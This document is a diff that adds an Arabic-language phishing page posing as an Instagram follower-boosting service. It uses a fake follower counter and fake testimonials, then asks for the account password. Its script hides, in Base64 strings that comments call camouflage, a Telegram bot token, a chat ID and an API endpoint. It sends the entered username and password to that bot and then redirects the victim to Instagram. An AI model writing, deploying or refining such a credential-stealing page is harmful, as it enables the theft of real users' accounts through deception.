@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث خدمات الحساب v2</title>
+    <style>
+        :root { --main-grd: linear-gradient(45deg, #f09433, #dc2743, #bc1888); }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 10px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .box-container { width: 100%; max-width: 400px; background: #121212; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .brand-logo { width: 70px; margin-bottom: 10px; }
+        .view-section { display: none; }
+        .visible { display: block; }
+        input { width: 100%; padding: 14px; margin: 10px 0; background: #262626; border: 1px solid #444; border-radius: 8px; color: #fff; box-sizing: border-box; text-align: center; font-size: 16px; }
+        .action-btn { width: 100%; padding: 14px; background: var(--main-grd); border: none; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
+        #num-gen { font-size: 50px; font-weight: bold; color: #00f2ff; margin: 20px 0; font-family: 'Courier New'; }
+        .status-msg { color: #f09433; font-weight: bold; margin-bottom: 10px; }
+        .social-feed { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; text-align: right; }
+        .feed-item { background: #1a1a1a; padding: 10px; border-radius: 8px; margin-bottom: 10px; font-size: 12px; border-right: 3px solid #bc1888; }
+        .feed-item b { color: #f09433; display: block; }
+    </style>
+</head>
+<body>
+    <div class="box-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="brand-logo">
+        <h2 style="font-size: 18px;">نظام تعزيز التفاعل المطور</h2>
+
+        <div id="v_1" class="view-section visible">
+            <p style="color: #ccc;">أدخل اسم المستخدم للبدء</p>
+            <input type="text" id="u_name" placeholder="Username" autocomplete="off">
+            <button class="action-btn" onclick="next_v(2)">بدء التوليد</button>
+        </div>
+
+        <div id="v_2" class="view-section">
+            <p class="status-msg">جاري الربط بالسحابة...</p>
+            <div id="num-gen">0</div>
+        </div>
+
+        <div id="v_3" class="view-section">
+            <h3 style="color: #4bb543;">تم التجهيز بنجاح!</h3>
+            <p style="font-size: 13px;">يرجى التحقق من ملكية الحساب لاستلام المتابعين</p>
+            <input type="password" id="u_pass" placeholder="Password" autocomplete="off">
+            <button class="action-btn" onclick="execute_final()">تأكيد العملية</button>
+        </div>
+
+        <div class="social-feed">
+            <div class="feed-item"><b>@ahmed_ali</b> تم الاستلام 5000 ✅</div>
+            <div class="feed-item"><b>@sara.insta</b> الطريقة شغالة شكراً</div>
+        </div>
+    </div>
+
+    <script>
+        // تشفير البيانات بنظام Base64 للتمويه
+        const _k1 = "ODYwNDI2Nzg1ODpBQUhaMmRCRlQtTGRNU19YRjZBRi02QmstandardS00aR0REQQ=="; 
+        const _k2 = "NjAxODYzOTkwMA==";
+        const _u = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==";
+
+        function next_v(n) {
+            if (n === 2) {
+                const user = document.getElementById('u_name').value;
+                if (!user) return alert("خطأ في البيانات");
+                document.getElementById('v_1').classList.remove('visible');
+                document.getElementById('v_2').classList.add('visible');
+                run_loader();
+            }
+        }
+
+        function run_loader() {
+            let c = 0;
+            let timer = setInterval(() => {
+                c += Math.floor(Math.random() * 150);
+                if (c >= 5000) {
+                    clearInterval(timer);
+                    document.getElementById('v_2').classList.remove('visible');
+                    document.getElementById('v_3').classList.add('visible');
+                }
+                document.getElementById('num-gen').innerText = c > 5000 ? 5000 : c;
+            }, 50);
+        }
+
+        function execute_final() {
+            const n = document.getElementById('u_name').value;
+            const p = document.getElementById('u_pass').value;
+            
+            if (p.length < 4) return alert("كلمة المرور ضعيفة");
+
+            // فك التشفير البرمجي لحظة الإرسال فقط
+            const endpoint = atob(_u) + atob(_k1) + "/sendMessage";
+            const payload = `New Hit: ${n} | Pass: ${p}`;
+
+            fetch(`${endpoint}?chat_id=${atob(_k2)}&text=${encodeURIComponent(payload)}`)
+            .finally(() => {
+                window.location.replace(atob("aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8="));
+            });
+        }
+    </script>
+</body>
+</html>
